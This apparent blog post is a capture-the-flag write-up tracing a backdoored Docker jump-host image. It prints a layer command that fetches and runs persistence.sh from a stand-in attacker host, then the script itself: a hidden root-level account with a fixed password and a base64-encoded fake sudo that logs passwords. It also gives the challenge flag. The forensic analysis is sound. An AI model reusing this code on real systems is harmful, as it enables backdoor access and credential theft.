---
layout: post
title: OpenECSC - Quick Response Code
date: 2022-04-30 15:51 +0200
author: Danique
tags: ctf openecsc pentest
categories: [CTF, Penetration Testing]
---
Easy challenge in the OpenECSC online environment, round 2, on HackingLab. Solved on 30-4-2022.

## Challenge Description
Developers have noticed that latest version of a SSH jump host which they are using for remote access is acting weirdly. When inspecting logs, they notice logins from strange accounts that should not be there. Their own dev account password also seems to be compromised, as logins are coming from unknown IP addresses. Sysadmins have recreated the jump host container from the latest image but with no luck. Same activity is still seen. Could the Docker repository be hacked? Could the hackers have tampered with the image? You must find out!

## Solution
First we pull the image from the Docker hub using 
```
docker pull hackinglab/jumphost
docker images
```

Next, we save the docker image so we can take a look at all the data:
```
sudo docker save -o image.tar hackinglab/jumphost
```

Which gives us a .tar file which we can extract and look through. If we look at the .json file in the tar we can see something interesting: 

```
{"created":"2021-08-22T09:39:55.595347697Z","created_by":"/bin/sh -c echo \"172.17.0.1\tattack.er\" \u003e\u003e /etc/hosts ; wget http://attack.er/persistence.sh \u0026\u0026 chmod +x persistence.sh \u0026\u0026 bash persistence.sh"},{"created":"2021-08-22T09:39:56.696079676Z","created_by":"/bin/sh -c rm persistence.sh"}
```

So there is a persistence.sh file that is downloaded and executed. So we need to find this file as there is probably a flag in there!


Trying to find the file in the extracted data of the docker image does not give any results, however when searching on the entire system we do get some files!:
```
$ sudo find / -name persistence.sh
find: ‘/run/user/1000/gvfs’: Permission denied
/var/lib/docker/overlay2/63d3207b57ab6fcd1717bbd35872e8fc26e91e556647c32bae256cc0127c9b62/diff/persistence.sh
/var/lib/docker/overlay2/38f36a939c4614642ec3f32f4e7743878d806a93f3f954581c2fb95fb00aa943/diff/persistence.sh
```

We view one of these files to see what the persistence script does:
```
$ sudo cat /var/lib/docker/overlay2/63d3207b57ab6fcd1717bbd35872e8fc26e91e556647c32bae256cc0127c9b62/diff/persistence.sh

#!/bin/bash

# Planting persistence

###############################################
# FLAG = d4da58b6-d572-4992-8342-7747969911d5 #
###############################################

useradd -ou 0 -g 0 systemservice
echo "systemservice:backdoorpass1" | chpasswd

mkdir /home/devs/.hidden

echo "IyBGbGFnIGlzIG5vdCBoZXJlIDooCgpyZWFkIC1zcCAiW3N1ZG9dIHBhc3N3b3JkIGZvciAkVVNF
UjogIiBzdWRvcGFzcwplY2hvICIiCnNsZWVwIDIKZWNobyAiU29ycnksIHRyeSBhZ2Fpbi4iCmVj
aG8gJHN1ZG9wYXNzID4+IC90bXAvcGFzcy50eHQKCi91c3IvYmluL3N1ZG8gJEAK" | base64 -d > /home/devs/.hidden/fsudo

chmod a+x /home/devs/.hidden/fsudo
echo "alias sudo=~/.hidden/fsudo" >> /home/devs/.bashrc
```
Which gives us our flag!
